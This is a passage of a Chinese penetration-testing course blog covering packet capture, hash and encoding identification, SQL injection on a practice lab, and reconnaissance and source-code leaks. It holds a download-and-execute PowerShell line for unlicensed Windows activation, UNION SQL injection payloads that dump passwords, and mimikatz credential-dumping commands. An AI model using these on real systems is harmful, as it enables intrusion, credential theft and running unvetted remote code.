class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell</span><br><span class="line">irm https://massgrave.dev/get |iex</span><br><span class="line">弹出来的命令窗，选，是</span><br><span class="line">然后出来的窗口，在下面输入：1，回车等待激活</span><br></pre></td></tr></table></figure><h2 id="参考点"><a href="#参考点" class="headerlink" title="#参考点:"></a>#参考点:</h2><p><strong>Fiddler:</strong></p><p>是一个http协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的http通讯，设置断点，查看所有的“进出”Fiddler的数据(指cookie,html，js,css等文件)。 Fiddler 要比其他的网络调试器要更加简单，因为它不仅仅暴露http通讯还提供了一个用户友好的格式。</p><p><strong>charles：</strong></p><p>是一个HTTP代理服务器,HTTP监视器,反转代理服务器，当浏览器连接charles的代理司互联网时，Charles可以监控浏览器发送和接收的所有数据。它允许一个开发者查看有连接互联网的HTTP通信，这些包括request，response和HTTPheaders(包含ookies与caching信息)</p><p><strong>TCPDump:</strong></p><p>是可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信<br>志。</p><p><strong>BurpSuite:</strong></p><p>是用于攻击web 应用程序的集成平台，包含了许多工具。Burp suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</p><p><strong>wireshark:</strong></p><p>是一个网络封包分析软件。网络封包分析软件的功能是截取网络封包，并尽可能显示出最为详细的网络封包资料。wireshark使用winecAP作为接口，直接与网卡进行数据报文交换。</p><p><strong>科来网络分析系统:</strong></p><p>是一款由科来软件全自主研发，并拥有全部知识产品的网络分析产品。该系统具有行业领先的专家分析技术，通过捕获并分析网络中传输的底层数据包，对网络故障、网络安全以及网络性能进行全面分析，从而快速排查网络中出现或潜在的故障、安全及性能问题。</p><p><strong>WPE&amp;封包分析:</strong></p><p>是强大的网络封包编辑器，wpe可以截取网络上的信息，修改封包数据是外挂制作的常用工具。一般在安全测试中可用来调试数据通讯地址。</p><h2 id="演示案例-1"><a href="#演示案例-1" class="headerlink" title="演示案例:"></a><strong>演示案例:</strong></h2><p>WEB应用站点操作数据抓包-<strong>浏览器审查</strong>查看元素网络监听</p><p>APP&amp;小程序&amp;PC抓包HTTP&#x2F;S数据-Charles&amp;Fiddler&amp;Burpsuite</p><p>程序进程&amp;网络接口&amp;其他协议抓包-WireShark&amp;科来网络分析系统</p><p>这两个是可以抓到更多的协议的数据包</p><p>通讯类应用封包分析发送接收-WPE四件套封包&amp;科来网络分析系统</p><h3 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h3><h4 id="环境配置-1"><a href="#环境配置-1" class="headerlink" title="#环境配置:"></a>#环境配置:</h4><p>1、安卓模拟器安装搭建</p><p>逍遥，雷电，夜神等自行百度下载安装</p><p>2、工具相关证书安装指南<br>Charles<br><a href="http://t.csdnimg.cn/Qpuxc">http://t.csdnimg.cn/Qpuxc</a></p><p><a href="https://blog.csdn.net/weixin45459427/article/details/108393878">https://blog.csdn.net/weixin45459427/article/details/108393878</a></p><p>Fidder<br><a href="https://blog.csdn.net/weixin_45043349/article/details/120088449">https://blog.csdn.net/weixin_45043349/article/details/120088449</a></p><p>BurpSuite<br><a href="https://blog.csdn.net/qg36658099/article/details/81487491">https://blog.csdn.net/qg36658099/article/details/81487491</a></p><p>1、为什么要抓包?-抓包应用的资产信息进行安全测试</p><p>2、抓包对象有那些?-小程序,APP,桌面应用等</p><p>3、抓包协议区别工具?-有部分应用不走HITP&#x2F;S，需要用到全局协议抓包</p><p>4、封包和抓包不同之处? 零散整体的区别，封包能精确到每个操作的数据包</p><h1 id="Day4：30余种加密编码进制-Web-数据库-系统-代码-参数值"><a href="#Day4：30余种加密编码进制-Web-数据库-系统-代码-参数值" class="headerlink" title="Day4：30余种加密编码进制_Web_数据库_系统_代码_参数值"></a>Day4：30余种加密编码进制_Web_数据库_系统_代码_参数值</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、存储密码加密-web&amp;数据库&amp;系统</p><p>2、传输数据编码-各类组合传输参数值</p><p>3、代码特性加密-JSPHPNETEJAVA</p><p>4、数据显示编码-字符串数据显示编码</p><h2 id="本课意义"><a href="#本课意义" class="headerlink" title="#本课意义:"></a>#本课意义:</h2><p>1.了解加密编码进制在安全测试中的存在</p><p>2.掌握常见的加密解密编码解码进制互转的操作</p><p>3.了解常见的加密解密编码解密进制互转的影够</p><p>旨在解决类似疑问，提供思路:</p><p>你是否碰到不知道的加密方式?</p><p>你是否碰到无法找到的解密平台?</p><p>你是否碰到不知道如何解密的字符串?</p><p>你是否准备参加CTF比赛补充此类知识点?</p><h2 id="详细点："><a href="#详细点：" class="headerlink" title="#详细点："></a>#详细点：</h2><h3 id="密码存储加密"><a href="#密码存储加密" class="headerlink" title="密码存储加密"></a>密码存储加密</h3><p>MD5 H1S  RMD5值是32位由数字”0-9”和字母”a-f”所组成的字符串</p><p>SHA1这种加密的密文特征跟MD5差不多，只不过位数是40</p><p>NTLM这种加密是windows的哈希密码，标准通讯安全协议</p><p>AES，DES，RC4这些都是非对称性加密算法，引入密钥，密文特征与Base64类似</p><p>应用场录:各类应用密文，自定义算法，代码分析，CrE安全比赛等</p><h3 id="传输数据编码"><a href="#传输数据编码" class="headerlink" title="传输数据编码:"></a>传输数据编码:</h3><p>BASE64 URL HEX ASCII</p><p>BASE64值是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,结尾通常有符号&#x3D;</p><p>URI编码是由数字”0-9”和字母”a-f”所组成的字符串,大小写敏感,通常以&amp;数字字母间隔</p><p>HEX编码是计算机中数据的一种表示方法,将数据进行十六进制转换，它由0-9，A-F组成</p><p>ASCII编码是将128个字符进行进制数来表示，常见ASCII码表大小规则:0<del>9&lt;A</del>z&lt;a</p><h3 id="举例"><a href="#举例" class="headerlink" title="举例:"></a>举例:</h3><p>个人博客-URL解码</p><p>国外WEB-BASE64解码</p><p>搜狐视频-BASE64解码</p><p>应用场景:参数传递(如注入影响)，后期WAF绕过干扰写法应用，视频地址还原等</p><h3 id="js前端代码加密："><a href="#js前端代码加密：" class="headerlink" title="js前端代码加密："></a>js前端代码加密：</h3><p>Js颜文字 jother JSFUCK</p><p>颜文字特征:一堆颜文字构成的1代码，在12中可直接解密执行</p><p>jother特征:只用 !  + ( )[ ]{ }这八个字符就能完成对任意字符串的编码。也可在F12中解密执行</p><p>JSFUCK特征:与jother很像，只是少了{ }</p><h3 id="后端代码加密"><a href="#后端代码加密" class="headerlink" title="后端代码加密:"></a>后端代码加密:</h3><p>PHP NET JAVA</p><p>PHP:乱码，头部有信息</p><p>.NEI:DLL封装代码文件</p><p>JAVA:JAVACLASS文件</p><p>举例:zend ILSPY IDEA （zend php文件打开是乱码，通过文件头信息判断）</p><p>应用场景:版权代码加密，开发特性，CTF比赛等</p><h3 id="数据库密文加密"><a href="#数据库密文加密" class="headerlink" title="数据库密文加密:"></a>数据库密文加密:</h3><p>MYSQL MSSQL等</p><p> mysql-&gt;user-&gt;密码也可以在cmd5解密</p><h3 id="数据显示编码："><a href="#数据显示编码：" class="headerlink" title="数据显示编码："></a>数据显示编码：</h3><p>UTF-8, GBK2312</p><h3 id="识别算法编码类型："><a href="#识别算法编码类型：" class="headerlink" title="识别算法编码类型："></a>识别算法编码类型：</h3><p>1、看位数</p><p>2、看密文的特征（数字、字母、大小写、符号等）</p><p>3、看当前密文存在的地方（Web、数据库、操作系统等应用）</p><h2 id="演示案例-2"><a href="#演示案例-2" class="headerlink" title="演示案例:"></a>演示案例:</h2><h4 id="Web-ZZCMS-密文-MD5"><a href="#Web-ZZCMS-密文-MD5" class="headerlink" title="Web-ZZCMS-密文-MD5"></a>Web-ZZCMS-密文-MD5</h4><p>这个网站下载源码直接放到www目录下即可，但后面发现nginx的配置里有个文件带有空格，会报错，重新移出来后才没有，还有一个注意点，这个设置主页是最好选到zzcms文件里，不能只到www，因为安装引导时，目录是根目录下的install而不是zzcms下的install，那样403了好久，一直以为权限问题。。。接下来下一步，下一步就好，信息正常填。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322152833066.png" alt="image-20240322152833066"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322152905896.png" alt="image-20240322152905896"></p><p>有两个管理员，然后去数据库里看看密码是如何存储的</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322153145609.png" alt="image-20240322153145609"></p><p>去cmd5.com验证一下</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322153223102.png" alt="image-20240322153223102"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322153532437.png" alt="image-20240322153532437"></p><h4 id="Web-Discuz-密文-MD5-amp-Salt"><a href="#Web-Discuz-密文-MD5-amp-Salt" class="headerlink" title="Web-Discuz-密文-MD5&amp;Salt"></a>Web-Discuz-密文-MD5&amp;Salt</h4><p>安装Discuz时目录要选到uploads下，然后下一步下一步就是了</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322161139610.png" alt="image-20240322161139610"></p><p>注册一个用户看看</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322161513691.png" alt="image-20240322161513691"></p><p>然后我们去查是查不到的，需要知道他的盐值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md</span>(<span class="string">&#x27;123456&#x27;</span>),<span class="string">&quot;d825a3&quot;</span>); --php5.<span class="number">5</span>之前</span><br><span class="line"><span class="title function_ invoke__">password_hash</span>() --php5.<span class="number">5</span>之后</span><br></pre></td></tr></table></figure><p>但Discuz的加密方式是前一种，去另一个表中查看一下带有盐值的表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from pre_ucenter_members;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322163728021.png" alt="image-20240322163728021"></p><p>前面被$包住的就是盐值，但不知道为什么盐值是空的，导出数据库看看。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysqldump -uroot -proot dbname &gt; dbname.sql</span><br></pre></td></tr></table></figure><p>因为我们这个使用password_hash()返回的值</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322165230036.png" alt="image-20240322165230036"></p><p>只能这样验证了</p><p><a href="https://www.mozhe.cn/bug/detail/elRHc1BCd2VIckQxbjduMG9BVCtkZz09bW96aGUmozhe">练习</a></p><p>信息收集</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322171623378.png" alt="image-20240322171623378"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322171642952.png" alt="image-20240322171642952"></p><p>主要有上面两个界面，前一个页面时没有注入点的，怎么测试都是正常回显，但后面的页面当输入的id&#x3D;2时，页面会异常回显，说明该页面存在注入点。</p><p>判断类型 id&#x3D;1 and 1&#x3D;2-1，正常回显说明是数字型，判断列数 order by 4，4列</p><p>判断回显位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,2,3,4 #</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322172148784.png" alt="image-20240322172148784"></p><p>下面就是正常的三步走</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1 union select 1,database(),3,4 #</span><br><span class="line">?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema=database() and table_name=&#x27;StormGroup_member&#x27;</span><br><span class="line">?id=-1 union select 1,group_concat(name,&#x27;~&#x27;,password),3,4 from StormGroup_member</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322172245928.png" alt="image-20240322172245928"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322172450975.png" alt="image-20240322172450975"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322172546176.png" alt="image-20240322172546176"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322172704509.png" alt="image-20240322172704509"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322172834903.png" alt="image-20240322172834903"></p><p>猜测密码是md5，cmd5测试一下mozhe-841076</p><p>系统-Windows-密文-NTLM&amp;HASH</p><p>mimikatz要以<strong>管理身份</strong>打开</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322174208878.png" alt="image-20240322174208878"></p><p>同样可以去cmd5验证，但有的也没有</p><h4 id="综合-参数-密文传输-AES-amp-BASE64"><a href="#综合-参数-密文传输-AES-amp-BASE64" class="headerlink" title="综合-参数-密文传输-AES&amp;BASE64"></a><strong>综合-参数-密文传输-AES&amp;BASE64</strong></h4><p><a href="http://tool.chacuo.net/cryptdes%E5%B7%A5%E5%85%B7%E7%BD%91%E7%AB%99">http://tool.chacuo.net/cryptdes工具网站</a></p><p><a href="https://www.mozhe.cn/bug/detail/110">练习</a></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322203510007.png" alt="image-20240322203510007"></p><p>注意到参数很长，可能是加密后的参数，信息收集一下</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322203621578.png" alt="image-20240322203621578"></p><p>这里是网页源代码，可以下载下来看看</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322203805719.png" alt="image-20240322203805719"></p><p>可以看到加密流程，我们搜索一下各个函数的信息</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322203855700.png" alt="image-20240322203855700"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$td</span> = <span class="title function_ invoke__">mcrypt_module_open</span>(MCRYPT_RIJNDAEL_128,<span class="string">&#x27;&#x27;</span>,MCRYPT_MODE_CBC,<span class="string">&#x27;&#x27;</span>);<span class="comment">//AES加密，128块，模式CBC</span></span><br><span class="line">    <span class="title function_ invoke__">mcrypt_generic_init</span>(<span class="variable">$td</span>,<span class="string">&#x27;ydhaqPQnexoaDuW3&#x27;</span>,<span class="string">&#x27;2018201920202021&#x27;</span>);<span class="comment">//前面是密钥，后面是偏移量</span></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">mdecrypt_generic</span>(<span class="variable">$td</span>,<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>)));<span class="comment">//两次base64加密，说明还要解密一次，才能作运算</span></span><br><span class="line"><span class="title function_ invoke__">mcrypt_generic_deinit</span>(<span class="variable">$td</span>);</span><br><span class="line"><span class="title function_ invoke__">mcrypt_module_close</span>(<span class="variable">$td</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$data</span>),-<span class="number">6</span>)!==<span class="string">&#x27;_mozhe&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$data</span>),<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$data</span>))-<span class="number">6</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先base64解密一次</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322204222067.png" alt="image-20240322204222067"></p><p>再去aes解密</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240322204315425.png" alt="image-20240322204315425"></p><h4 id="代码-解密-解密反编译-Zend-amp-Dll-amp-Jar"><a href="#代码-解密-解密反编译-Zend-amp-Dll-amp-Jar" class="headerlink" title="代码-解密-解密反编译-Zend&amp;Dll&amp;Jar"></a><strong>代码-解密-解密反编译-Zend&amp;Dll&amp;Jar</strong></h4><p>CTF赛题-buuoj-single dog-JS颜文字</p><p>CTF赛题-xuenixiang-Jsfuck-JSFUCK</p><h2 id="补充点"><a href="#补充点" class="headerlink" title="#补充点:"></a>#补充点:</h2><p>1.常见加密编码进制等算法解析</p><p>MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES等</p><p>2.常见加密编码形式算法解析</p><p>直接加密，带sa1t，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p><p>3.常见解密解码方式(针对)</p><p>枚举，自定义逆向算法，可逆向</p><p>4.常见加密解码算法的特性</p><p>长度位数，字符规律，代码分析，搜索获取等</p><h3 id="拓展补充参考盗料"><a href="#拓展补充参考盗料" class="headerlink" title="#拓展补充参考盗料:"></a>#拓展补充参考盗料:</h3><p>部分资源:<br><a href="https://www.cmd5.com/">https://www.cmd5.com</a></p><p><a href="http://tmxk.org/jother">http://tmxk.org/jother</a></p><p><a href="http://www.jsfuck.com/">http://www.jsfuck.com</a></p><p><a href="http://www.hiencode.com/">http://www.hiencode.com</a><br><a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a></p><p><a href="https://utf-8.jp/public/aanocde.html">https://utf-8.jp/public/aanocde.html</a></p><h1 id="Day5：资产架构-端口-应用-CDN-WAF-站库分离-负载ay均衡"><a href="#Day5：资产架构-端口-应用-CDN-WAF-站库分离-负载ay均衡" class="headerlink" title="Day5：资产架构_端口_应用_CDN_WAF_站库分离_负载ay均衡"></a>Day5：资产架构_端口_应用_CDN_WAF_站库分离_负载ay均衡</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、资产架构-端口&amp;目录&amp;播件接口s多站点&amp;多应用</p><p>2、番外安全-域名&amp;服务器本身&amp;服务厂商:管理人员</p><p>3、考虑阻碍-站库分离&amp;CDN&amp;WAF&amp;负载均衡&amp;主机防护</p><h2 id="详细点"><a href="#详细点" class="headerlink" title="#详细点:"></a>#详细点:</h2><p>1、前置条件-购买使用-云服务器&amp;域名等</p><p>2、架构搭建-目录&amp;端口&amp;子域s插件&amp;应用等</p><p>3、安全部署-WAF防火墙s主机防护sHIDS等</p><p>4、性能优化-负载均衡:CDI加速soss云存储等</p><h2 id="演示案例-3"><a href="#演示案例-3" class="headerlink" title="演示案例:"></a>演示案例:</h2><p>资产架构-BT搭建&amp;多站点&amp;多插件&amp;多应用等</p><p>在之前的服务器的基础上，搭建一个网站</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240323152352818.png" alt="image-20240323152352818"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240323154746404.png" alt="image-20240323154746404"></p><p>没有域名就用自己的ip地址，然后选一个非网站根目录的文件，或自己新建一个文件夹</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240323154833089.png" alt="image-20240323154833089"></p><p>然后一直下一步，把信息填好就ok了，那个初始化可以不用填</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240323155029222.png" alt="image-20240323155029222"></p><p>也有可能一个网站里有两个程序，任何一个程序出现漏洞，都可能进入安全测试</p><p>番外安全-Aliyun&amp;域名解析&amp;云服务器&amp;个人等</p><p>考虑阻碍-站库分离&amp;部署防护&amp;负载均衡&amp;CDN等</p><h3 id="资产架构"><a href="#资产架构" class="headerlink" title="#资产架构:"></a>#资产架构:</h3><p>WEB单个源码指向安全</p><p>WEB多个目录源码安全</p><p>WEB多个端口源码安全</p><p>服务器架设多个站点安全</p><p>架设第三方插件接口安全 phpmyadmin之类的，方便管理人员但也给攻击者提供了机会</p><p>服务器架设多个应用安全 ftp之类的</p><h3 id="番外安全"><a href="#番外安全" class="headerlink" title="#番外安全:"></a>#番外安全:</h3><p>基于域名解析安全</p><p>基于服务器本身安全</p><p>基于服务商信息安全</p><p>基于管理个人的安全</p><h3 id="考虑阻碍"><a href="#考虑阻碍" class="headerlink" title="#考虑阻碍:"></a>#考虑阻碍:</h3><p>阻碍-站库分离 数据库放在别的地方</p><p>阻碍-CDN加速服务</p><p><strong>CDN</strong>英文全称<code>Content Delivery Network</code>，中文翻译即为<a href="https://cloud.tencent.com/product/cdn?from_column=20065&from=20065"><strong>内容分发网络</strong></a>。它是建立并覆盖在承载网之上，由分布在不同区域的边缘节点服务器群组成的分布式网络。</p><p>阻碍-<a href="https://blog.csdn.net/wanghangzhen/article/details/118554304">负载均衡服务</a></p><p>就是你最终获取到的是备用服务器信息</p><p>阻碍-WAF应用防火墙</p><p>阻碍-主机防护防火墙</p><h1 id="Day6-信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取"><a href="#Day6-信息打点-Web架构篇-域名-语言-中间件-数据库-系统-源码获取" class="headerlink" title="Day6: 信息打点-Web架构篇_域名_语言_中间件_数据库_系统_源码获取"></a>Day6: 信息打点-Web架构篇_域名_语言_中间件_数据库_系统_源码获取</h1><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、打点-web架构-语言&amp;中间件&amp;数据库&amp;系统等</p><p>2、打点-web源码-CMs开源s闭源售卖&amp;自主研发等</p><p>3、打点-web源码获取-泄露安全&amp;资源监控&amp;其他等</p><p>4、打点-web域名-子域名&amp;相似域名&amp;反查域名&amp;旁注等</p><h2 id="信息点"><a href="#信息点" class="headerlink" title="#信息点:"></a>#信息点:</h2><p>基础信息，系统信息，应用信息，防护信息，人员信息，其他信息等</p><h2 id="技术点"><a href="#技术点" class="headerlink" title="#技术点:"></a>#技术点:</h2><p>cMs识别，端口扫描，CDN绕过，源码获取，子域名查询，wAE识别，负载均衡识别等</p><h2 id="演示案例-4"><a href="#演示案例-4" class="headerlink" title="演示案例:"></a>演示案例:</h2><p>信息打点-个人博客-YOUZIPII-架构&amp;源码</p><p>信息打点-某违法APP-面具约会-架构&amp;源码</p><p>信息打点-某违法应用-爱心工程-架构&amp;域名</p><p>信息打点-某专属SRC-补天平台-架构&amp;域名</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240325203443839.png" alt="image-20240325203443839"></p><p>根据这个可以查出更多信息，比如中间件推测端口，服务，脚本语言推测常用数据库</p><p><a href="https://blog.csdn.net/zengxianglei/article/details/94357189">关系型和非关系型数据库的区别</a></p><p>mysql 3306 </p><p>mssql 1443 </p><p>oracle 1521 </p><p>redis 6379 </p><p>DB2  5000</p><p>国产DM达梦数据库 5236</p><p>MongoDB 27017</p><p>判断方式也不一定准确。下面是默认操作系统的TTL：<br>1、WINDOWS NT&#x2F;2000   TTL：128<br>2、WINDOWS 95&#x2F;98     TTL：32<br>3、UNIX              TTL：255<br>4、LINUX             TTL：64<br>5、WIN7          TTL：128</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240325205214933.png" alt="image-20240325205214933"></p><p>源码-直接利用公开的漏洞库尝试安全测试</p><p>源码-白盒代码审计 挖漏洞</p><p>msql漏洞或弱口令</p><p>php常见的漏洞 如log4j</p><h3 id="黑源码"><a href="#黑源码" class="headerlink" title="黑源码"></a>黑源码</h3><p><a href="https://www.huzhan.com/">https://www.huzhan.com/</a><br><a href="https://28xin.com/">https://28xin.com/</a><br><a href="https://bbs.bcb5.com/">https://bbs.bcb5.com/</a><br><a href="https://www.shixinwl.com/">https://www.shixinwl.com/</a><br><a href="https://www.lengcat.com/">https://www.lengcat.com/</a><br><a href="https://www.xlymz.com/">https://www.xlymz.com/</a><br><a href="https://www.ymadx.com/">https://www.ymadx.com/</a><br>……..</p><p>更多针对违法应用源码：<br>可利用fofa和bing、谷歌等搜索关键字获取</p><p><a href="http://www.jmlsd.com/">www.jmlsd.com</a></p><p>子域名：变动www</p><p>变动jmlsd或com为相似域名</p><p><a href="https://www.cnblogs.com/Timeouting-Study/p/16082575.html">jessionid和session</a></p><p>有时候有CDN存在，扫描可能就没那么有用了。</p><h1 id="Day7-信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份"><a href="#Day7-信息打点-资产泄漏-CMS识别-Git监控-SVN-DS-Store-备份" class="headerlink" title="Day7:信息打点-资产泄漏_CMS识别_Git监控_SVN_DS_Store_备份"></a>Day7:信息打点-资产泄漏_CMS识别_Git监控_SVN_DS_Store_备份</h1><h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="#知识点:"></a>#知识点:</h2><p>1、CMS指纹识别源码获取方式</p><p>2、习惯&amp;配置&amp;特性等获取方式</p><p>3、托管资产平台资源搜索监控</p><h2 id="详细点-1"><a href="#详细点-1" class="headerlink" title="#详细点:"></a>#详细点:</h2><p>参考:<a href="https://www.secpulse.com/archives/124398.html%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E5%8E%9F%E5%9B%A0">https://www.secpulse.com/archives/124398.html源码泄漏原因</a>:<br>源码泄漏原因:<br>1、从源码本身的特性入口2、从管理员不好的习惯入口<br>3、从管理员不好的配置入口<br>4、从管理员不好的意识入口<br>5、从管理员资源信息搜集入口</p><ul><li>composer.jspn</li><li>git源码泄露</li><li>svn源码泄露</li><li>hg源码泄漏</li><li>网站备份压缩文件</li><li>WEB-INF&#x2F;web.xml泄露文件泄露DSStore</li><li>SwP 文件泄露</li><li>cvs泄露</li><li>Bzr泄露</li><li>GitHub源码泄漏</li></ul><h2 id="演示案例-5"><a href="#演示案例-5" class="headerlink" title="演示案例:"></a>演示案例:</h2><h3 id="直接获取-CMS识别-云悉指纹识别平台"><a href="#直接获取-CMS识别-云悉指纹识别平台" class="headerlink" title="直接获取-CMS识别-云悉指纹识别平台"></a>直接获取-CMS识别-云悉指纹识别平台</h3><p><a href="https://www.yunsee.cn/">云悉指纹</a>,然后下载进行白盒审计</p><h3 id="习惯不好-备份文件-某黑阔博客源码泄漏"><a href="#习惯不好-备份文件-某黑阔博客源码泄漏" class="headerlink" title="习惯不好-备份文件-某黑阔博客源码泄漏"></a>习惯不好-备份文件-某黑阔博客源码泄漏</h3><p>相关利用项目:</p><p>CMS只别:<a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></p><p>份:敏感目录文件扫描-7kbscan-webPathBrute</p><p>CVs:<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a></p><p>GIT: <a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p><p>SVN:<a href="https://github.com/callmefeifei/SvnHack">https://github.com/callmefeifei/SvnHack</a></p><p>Ds_Store: <a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a></p><h3 id="配置不当-GIT泄漏-某程序员博客源码泄漏"><a href="#配置不当-GIT泄漏-某程序员博客源码泄漏" class="headerlink" title="配置不当-GIT泄漏-某程序员博客源码泄漏"></a>配置不当-GIT泄漏-某程序员博客源码泄漏</h3><p>可以试试访问.git目录，存在的话就可以试试利用</p><h3 id="配置不当-SVN泄漏-某国外小伙子源码泄漏"><a href="#配置不当-SVN泄漏-某国外小伙子源码泄漏" class="headerlink" title="配置不当-SVN泄漏-某国外小伙子源码泄漏"></a>配置不当-SVN泄漏-某国外小伙子源码泄漏</h3><h3 id="配置不当-DS-Store泄漏-某开发Mac源码泄漏"><a href="#配置不当-DS-Store泄漏-某开发Mac源码泄漏" class="headerlink" title="配置不当-DS_Store泄漏-某开发Mac源码泄漏"></a>配置不当-DS_Store泄漏-某开发Mac源码泄漏</h3><h3 id="PHP特性-composer-json泄漏-某直接搭建源码泄漏"><a href="#PHP特性-composer-json泄漏-某直接搭建源码泄漏" class="headerlink" title="PHP特性-composer.json泄漏-某直接搭建源码泄漏"></a>PHP特性-composer.json泄漏-某直接搭建源码泄漏</h3><h3 id="下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava"><a href="#下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava" class="headerlink" title="下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava"></a>下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava</h3><p>配合文件下载漏洞</p><h3 id="资源监控-GITHUB泄漏-语法搜索-amp-关键字搜索-amp-社工"><a href="#资源监控-GITHUB泄漏-语法搜索-amp-关键字搜索-amp-社工" class="headerlink" title="资源监控-GITHUB泄漏-语法搜索&amp;关键字搜索&amp;社工"></a>资源监控-GITHUB泄漏-语法搜索&amp;关键字搜索&amp;社工</h3><h1 id="Day8-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙"><a href="#Day8-信息打点-系统篇-端口扫描-CDN服务-负载均衡-WAF防火墙" class="headerlink" title="Day8: 信息打点-系统篇_端口扫描_CDN服务_负载均衡_ WAF防火墙"></a>Day8: 信息打点-系统篇_端口扫描_CDN服务_负载均衡_ WAF防火墙</h1><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240329193707328.png" 